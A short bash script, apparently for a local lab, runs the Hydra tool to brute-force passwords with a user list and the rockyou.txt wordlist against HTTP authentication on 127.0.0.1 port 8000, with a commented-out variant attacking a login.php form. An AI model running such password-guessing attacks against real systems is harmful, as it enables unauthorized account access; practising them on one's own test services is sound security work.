#!/bin/bash

hydra -L users.txt -P rockyou.txt -s 8000 -f 127.0.0.1 http-get 
# hydra -L users.txt -P rockyou.txt -s 8001 -f 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^" /
